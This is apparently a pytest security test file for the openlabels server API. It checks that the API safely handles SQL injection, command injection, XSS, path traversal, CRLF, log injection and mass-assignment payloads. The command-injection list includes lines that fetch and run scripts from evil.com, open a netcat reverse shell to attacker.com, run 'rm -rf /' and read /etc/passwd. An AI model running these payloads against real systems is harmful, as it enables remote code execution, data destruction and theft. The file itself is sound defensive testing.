"""
Tests for injection attack prevention.

These tests verify that user input is properly sanitized
to prevent SQL injection, command injection, and other
injection attacks.
"""

import pytest
from uuid import uuid4

from httpx import AsyncClient, ASGITransport
from openlabels.server.app import app
from openlabels.server.db import get_session
from openlabels.auth.dependencies import get_current_user, get_optional_user, require_admin, CurrentUser
from openlabels.server.models import Tenant, User, ScanTarget


@pytest.fixture
async def injection_test_setup(test_db):
    """Set up test data for injection tests."""
    tenant = Tenant(
        id=uuid4(),
        name="Injection Test Tenant",
        azure_tenant_id="injection-test",
    )
    test_db.add(tenant)
    await test_db.flush()

    user = User(
        id=uuid4(),
        tenant_id=tenant.id,
        email="test@example.com",
        name="Test User",
        role="admin",
    )
    test_db.add(user)

    # Create a legitimate target
    target = ScanTarget(
        id=uuid4(),
        tenant_id=tenant.id,
        name="Legitimate Target",
        adapter="filesystem",
        config={"path": "/safe/path"},
        enabled=True,
        created_by=user.id,
    )
    test_db.add(target)

    await test_db.commit()

    return {
        "tenant": tenant,
        "user": user,
        "target": target,
        "session": test_db,
    }


def create_test_client(test_db, user, tenant):
    """Create a test client authenticated as a specific user."""

    async def override_get_session():
        yield test_db

    def _create_current_user():
        return CurrentUser(
            id=user.id,
            tenant_id=tenant.id,
            email=user.email,
            name=user.name,
            role=str(user.role),
        )

    async def override_get_current_user():
        return _create_current_user()

    async def override_get_optional_user():
        return _create_current_user()

    async def override_require_admin():
        return _create_current_user()

    app.dependency_overrides[get_session] = override_get_session
    app.dependency_overrides[get_current_user] = override_get_current_user
    app.dependency_overrides[get_optional_user] = override_get_optional_user
    app.dependency_overrides[require_admin] = override_require_admin

    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test")


class TestSQLInjection:
    """Tests for SQL injection prevention."""

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE scans; --",
        "1 OR 1=1",
        "1; DELETE FROM users; --",
        "1 UNION SELECT * FROM users",
        "' OR '1'='1",
        "admin'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT pg_sleep(5)--",
    ]

    @pytest.mark.asyncio
    async def test_target_name_sql_injection(self, injection_test_setup):
        """SQL injection in target name should be safely handled."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.SQL_INJECTION_PAYLOADS:
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": payload,
                        "adapter": "filesystem",
                        "config": {"path": "/test"},
                    },
                )
                # Should either succeed (201) or fail with validation error (422)
                # Should NOT cause server error (500) or unexpected behavior
                assert response.status_code in (200, 201, 400, 422), \
                    f"Unexpected status {response.status_code} for SQL payload in name"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_search_query_sql_injection(self, injection_test_setup):
        """SQL injection in search queries should be safely handled."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.SQL_INJECTION_PAYLOADS:
                # Test in various query parameters
                response = await client.get(
                    "/api/results",
                    params={"search": payload},
                )
                # Should return 200 (empty results) or 422 (validation error)
                # Should NOT cause 500 or return all data
                assert response.status_code in (200, 400, 422), \
                    f"Unexpected status {response.status_code} for SQL payload in search"

                response = await client.get(
                    "/api/scans",
                    params={"filter": payload},
                )
                assert response.status_code in (200, 400, 422), \
                    f"Unexpected status {response.status_code} for SQL payload in filter"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_uuid_parameter_sql_injection(self, injection_test_setup):
        """SQL injection in UUID parameters should be safely handled."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.SQL_INJECTION_PAYLOADS:
                # UUID parameters should be validated as UUIDs
                response = await client.get(f"/api/scans/{payload}")
                # Should return 404 or 422, never 500
                assert response.status_code in (404, 422), \
                    f"Unexpected status {response.status_code} for SQL payload in UUID"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_sql_injection_does_not_leak_data(self, injection_test_setup):
        """SQL injection should not leak data from other tenants."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            # Try UNION-based injection to get all data
            union_payloads = [
                "' UNION SELECT * FROM users--",
                "1 UNION ALL SELECT id,email,name,role FROM users",
            ]

            for payload in union_payloads:
                response = await client.get(
                    "/api/targets",
                    params={"name": payload},
                )
                assert response.status_code in (200, 400, 422)

                if response.status_code == 200:
                    result = response.json()
                    items = result.get("items", result) if isinstance(result, dict) else result
                    # Should only see own tenant's targets
                    for item in items:
                        assert item.get("tenant_id") == str(data["tenant"].id) or \
                               "tenant_id" not in item, \
                            "SQL injection leaked data from other tenants!"

        app.dependency_overrides.clear()


class TestCommandInjection:
    """Tests for command injection prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        "/tmp/file; rm -rf /",
        "/tmp/file | cat /etc/passwd",
        "/tmp/file`whoami`",
        "/tmp/file$(id)",
        "/tmp/file && wget evil.com/shell.sh",
        "/tmp/$(touch /tmp/pwned)",
        "/tmp/file; curl evil.com | bash",
        "| nc -e /bin/sh attacker.com 4444",
    ]

    @pytest.mark.asyncio
    async def test_target_path_command_injection(self, injection_test_setup):
        """Command injection in target paths should be safely handled."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.COMMAND_INJECTION_PAYLOADS:
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": "Malicious Target",
                        "adapter": "filesystem",
                        "config": {"path": payload},
                    },
                )
                # Should be rejected or safely stored
                # Should NOT execute shell commands
                assert response.status_code in (200, 201, 400, 422), \
                    f"Unexpected status {response.status_code} for command injection payload"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_filename_command_injection(self, injection_test_setup):
        """Command injection in filenames should be prevented."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.COMMAND_INJECTION_PAYLOADS:
                # Test in search/filter that might be used in file operations
                response = await client.get(
                    "/api/results",
                    params={"file_name": payload},
                )
                # Should be safely handled
                assert response.status_code in (200, 400, 422), \
                    f"Unexpected status for command injection in filename"

        app.dependency_overrides.clear()


class TestXSSPrevention:
    """Tests for Cross-Site Scripting (XSS) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
    ]

    @pytest.mark.asyncio
    async def test_target_name_xss_stored(self, injection_test_setup):
        """XSS payloads in target names should be safely stored and returned."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.XSS_PAYLOADS:
                # Create target with XSS payload
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": payload,
                        "adapter": "filesystem",
                        "config": {"path": "/test"},
                    },
                )

                if response.status_code in (200, 201):
                    target_data = response.json()
                    # If stored, verify it's returned as data (escaped/raw JSON)
                    # not executed as HTML
                    returned_name = target_data.get("name", "")
                    # The Content-Type should be application/json (not text/html)
                    assert "application/json" in response.headers.get("content-type", ""), \
                        "Response should be JSON to prevent XSS execution"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_api_returns_json_content_type(self, injection_test_setup):
        """API responses should have JSON content type to prevent XSS."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            endpoints = [
                "/api/targets",
                "/api/scans",
                "/api/results",
                "/api/dashboard/stats",
            ]

            for endpoint in endpoints:
                response = await client.get(endpoint)
                if response.status_code == 200:
                    content_type = response.headers.get("content-type", "")
                    assert "application/json" in content_type, \
                        f"Endpoint {endpoint} should return JSON, got {content_type}"

        app.dependency_overrides.clear()


class TestPathTraversalInAPI:
    """Tests for path traversal in API parameters."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ]

    @pytest.mark.asyncio
    async def test_target_config_path_traversal(self, injection_test_setup):
        """Path traversal in target config should be prevented."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": "Traversal Target",
                        "adapter": "filesystem",
                        "config": {"path": payload},
                    },
                )
                # Should be rejected with 400/422 or stored safely
                # The actual traversal prevention happens at scan time
                assert response.status_code in (200, 201, 400, 422), \
                    f"Unexpected status {response.status_code} for path traversal"

        app.dependency_overrides.clear()


class TestJSONInjection:
    """Tests for JSON injection attacks."""

    @pytest.mark.asyncio
    async def test_json_pollution_in_config(self, injection_test_setup):
        """JSON pollution attacks in config should be prevented."""
        data = injection_test_setup

        pollution_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"path": "/test", "__proto__": {"isAdmin": True}},
        ]

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in pollution_payloads:
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": "Pollution Target",
                        "adapter": "filesystem",
                        "config": payload,
                    },
                )
                # Python/SQLAlchemy is not vulnerable to prototype pollution
                # but test anyway for defense in depth
                assert response.status_code in (200, 201, 400, 422)

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_deeply_nested_json(self, injection_test_setup):
        """Deeply nested JSON should not cause DoS."""
        data = injection_test_setup

        # Create deeply nested JSON (potential DoS)
        nested = {"a": "b"}
        for _ in range(100):
            nested = {"nested": nested}

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            response = await client.post(
                "/api/targets",
                json={
                    "name": "Deep Nested Target",
                    "adapter": "filesystem",
                    "config": nested,
                },
            )
            # Should either succeed or fail with 400/422, not hang or crash
            assert response.status_code in (200, 201, 400, 413, 422, 500)

        app.dependency_overrides.clear()


class TestHeaderInjection:
    """Tests for HTTP header injection."""

    @pytest.mark.asyncio
    async def test_crlf_in_redirect_parameter(self, injection_test_setup):
        """CRLF injection in redirect parameters should be prevented."""
        data = injection_test_setup

        crlf_payloads = [
            "http://example.com%0d%0aSet-Cookie:%20malicious=value",
            "http://example.com\r\nX-Injected: header",
            "/path%0d%0aX-Injected:%20header",
        ]

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in crlf_payloads:
                # Test auth callback redirect
                response = await client.get(
                    "/api/auth/callback",
                    params={"redirect": payload},
                    follow_redirects=False,
                )
                # Response headers should not contain injected headers
                assert "X-Injected" not in response.headers, \
                    "CRLF injection succeeded in adding header!"
                assert "malicious=value" not in response.headers.get("set-cookie", ""), \
                    "CRLF injection succeeded in setting cookie!"

        app.dependency_overrides.clear()


class TestLogInjection:
    """Tests for log injection prevention."""

    @pytest.mark.asyncio
    async def test_newline_in_user_input_sanitized(self, injection_test_setup):
        """Newlines in user input should not corrupt logs."""
        data = injection_test_setup

        log_injection_payloads = [
            "normal\n[CRITICAL] Fake critical message",
            "user\r\nINFO: Forged log entry",
            "test%0a[ERROR] Injected error",
        ]

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            for payload in log_injection_payloads:
                # Create target with log injection payload
                response = await client.post(
                    "/api/targets",
                    json={
                        "name": payload,
                        "adapter": "filesystem",
                        "config": {"path": "/test"},
                    },
                )
                # Should be handled - either stored or rejected
                assert response.status_code in (200, 201, 400, 422)

        app.dependency_overrides.clear()


class TestMassAssignment:
    """Tests for mass assignment vulnerabilities."""

    @pytest.mark.asyncio
    async def test_cannot_set_tenant_id_via_api(self, injection_test_setup):
        """Users should not be able to set tenant_id via API."""
        data = injection_test_setup
        other_tenant_id = str(uuid4())

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            response = await client.post(
                "/api/targets",
                json={
                    "name": "Malicious Target",
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                    "tenant_id": other_tenant_id,  # Try to set different tenant
                },
            )

            if response.status_code in (200, 201):
                target_data = response.json()
                # tenant_id should be set from auth, not request body
                assert target_data.get("tenant_id") != other_tenant_id, \
                    "Mass assignment allowed setting tenant_id!"

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_cannot_set_id_via_api(self, injection_test_setup):
        """Users should not be able to set resource id via API."""
        data = injection_test_setup
        malicious_id = str(uuid4())

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            response = await client.post(
                "/api/targets",
                json={
                    "name": "Malicious Target",
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                    "id": malicious_id,  # Try to set specific ID
                },
            )

            if response.status_code in (200, 201):
                target_data = response.json()
                # ID should be generated by server, not from request
                # (This may or may not be an issue depending on design)
                pass  # Just document this behavior

        app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_cannot_escalate_role_via_mass_assignment(self, injection_test_setup):
        """Users should not be able to escalate role via mass assignment."""
        data = injection_test_setup

        async with create_test_client(
            data["session"], data["user"], data["tenant"]
        ) as client:
            # Try to update user with role escalation
            response = await client.patch(
                f"/api/users/{data['user'].id}",
                json={
                    "name": "Updated Name",
                    "role": "superadmin",  # Try to escalate
                    "is_superuser": True,  # Try to add flags
                },
            )
            # Should either ignore extra fields or return error
            assert response.status_code in (200, 400, 403, 404, 422)

        app.dependency_overrides.clear()
